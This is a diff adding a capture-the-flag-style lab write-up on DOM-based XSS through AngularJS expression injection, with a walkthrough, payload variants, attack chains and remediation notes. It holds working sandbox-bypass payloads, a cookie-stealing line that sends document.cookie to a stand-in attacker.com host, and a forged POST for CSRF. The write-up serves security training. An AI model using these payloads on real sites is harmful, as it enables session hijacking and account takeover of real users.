@@ -3211,3 +3211,322 @@ DOM XSS → client-side execution with trigger
 If jQuery parses your input, you can turn selectors into scripts  
 
 ---
+
+# Lab-8 🐞 DOM-Based XSS (AngularJS Expression Injection) — Final Enhanced Write-Up
+
+---
+
+## 🔹 Overview
+
+DOM-Based Cross-Site Scripting (AngularJS-based) happens when:
+
+- User input enters through the URL (search parameter)  
+- AngularJS reads and processes that input  
+- Input is inserted into the page  
+- AngularJS interprets expressions  
+- JavaScript executes inside browser  
+
+---
+
+## 🔹 What Is This Topic?
+
+This lab demonstrates AngularJS-based DOM XSS.
+
+Instead of traditional HTML injection:
+
+→ We use AngularJS expressions
+
+Example pattern:
+```
+{{JS CODE}}
+```
+---
+
+## 🔹 Lab Walkthrough
+
+---
+
+### Step 1 — Open Lab
+
+Go to search functionality.
+
+---
+
+### Step 2 — Test Reflection
+
+Input:
+
+XSS123  
+
+---
+
+### Step 3 — Inspect Live DOM
+
+Using DevTools → Inspector
+
+Found:
+
+h1 tag showing search results containing user input  
+
+---
+
+### Step 4 — Identify Context
+
+→ Input is inside HTML text context  
+
+- Not attribute  
+- Not JavaScript  
+- Pure HTML rendering  
+
+---
+
+### Step 5 — Try Basic Payload
+```
+<script>alert(1)</script>
+```
+❌ Does NOT execute  
+
+---
+
+### Step 6 — Understand Why
+
+- Angle brackets are encoded  
+- Browser treats input as plain text  
+
+---
+
+### Step 7 — Detect AngularJS
+
+Check for:
+
+ng-app  
+
+→ AngularJS is active  
+
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+![AngularJS detected via ng-app](../images/angular-ng-app-detected.png)
+
+---
+
+### Step 8 — Try Basic Angular Payload
+```
+{{alert(1)}}
+```
+❌ Blocked / not executed  
+
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+![Basic angular payload blocked](../images/angular-basic-payload-blocked.png)
+
+---
+
+### Step 9 — Craft Bypass Payload
+
+Final Payload:
+```
+{{$on.constructor("alert(1)")()}}
+```
+---
+
+### Step 10 — Execution
+
+- Angular parses expression  
+- constructor builds function  
+- alert executes  
+
+💥 Alert triggered  
+
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+![Constructor payload execution](../images/angular-constructor-payload.png)
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Angular Expression Injection
+
+Example:
+
+div with angular expression rendering user input  
+
+Payload:
+```
+{{alert(1)}}
+```
+---
+
+### 🟢 Filter Bypass Using Constructor
+
+Payload:
+```
+{{$on.constructor("alert(1)")()}}
+```
+---
+
+### 🟢 When Functions Are Blocked
+
+Payload:
+```
+{{$on.constructor("window")()}}
+```
+---
+
+### 🟢 Character Restrictions Bypass
+
+Payload:
+```
+{{$on.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}
+```
+---
+
+### 🟢 Sandbox Escape Patterns
+
+Payload:
+```
+{{[].constructor.constructor("alert(1)")()}}
+```
+---
+
+### 🟢 Stored Angular XSS
+
+Stored payload executes for every user  
+
+---
+
+### 🟢 Admin Panel Injection
+
+Payload executes in admin browser  
+
+→ High impact  
+
+---
+
+### 🟢 Legacy Angular Dashboards
+
+Very common in:
+
+- Admin panels  
+- Internal tools  
+- Reporting systems  
+
+---
+
+## 🎯 High-Value Targets
+
+- Search functionality  
+- Filters  
+- AngularJS apps  
+- Admin dashboards  
+- CRM systems  
+- Analytics panels  
+- Internal enterprise tools  
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Session Hijacking
+```
+{{$on.constructor("fetch(\"https://attacker.com?c=\"+document.cookie)")()}}
+```
+---
+
+### 🔥 Account Takeover
+
+- Steal session cookies  
+- Extract tokens  
+
+---
+
+### 🔥 Admin Compromise
+
+Payload executed by admin  
+
+→ Full control  
+
+---
+
+### 🔥 Data Exfiltration
+
+- Read DOM  
+- Extract API responses  
+
+---
+
+### 🔥 CSRF Automation
+```
+{{$on.constructor("fetch(\"/change-email\",{method:\"POST\"})")()}}
+```
+---
+
+### 🔥 Advanced Chain
+
+Angular XSS  
+→ Steal CSRF token  
+→ Perform privileged actions  
+
+---
+
+## 🧪 Methodology
+
+- Identify input point  
+- Check reflection in DOM  
+- Identify context  
+- Test script payload  
+- If blocked → detect AngularJS  
+- Test simple expression  
+- Test alert expression  
+- If blocked → use constructor payload  
+- Confirm execution  
+
+---
+
+## 🛡 Remediation
+
+- Disable AngularJS expression parsing for user input  
+- Sanitize all inputs  
+- Avoid rendering raw user data  
+- Use contextual escaping  
+- Upgrade AngularJS  
+- Implement CSP  
+
+---
+
+## 💡 Notes / Mindset
+
+- HTML blocked ≠ safe  
+- AngularJS introduces hidden execution layer  
+- Filters can be bypassed using constructor  
+
+Always ask:
+
+→ Is Angular present?  
+→ Can I inject expressions?  
+→ Can I bypass restrictions?  
+
+---
+
+## 🧠 Mental Model
+
+Input  
+→ Reflection  
+→ HTML blocked  
+→ Detect Angular  
+→ Inject expression  
+→ Bypass filter  
+→ Execute  
+→ Impact  
+
+---
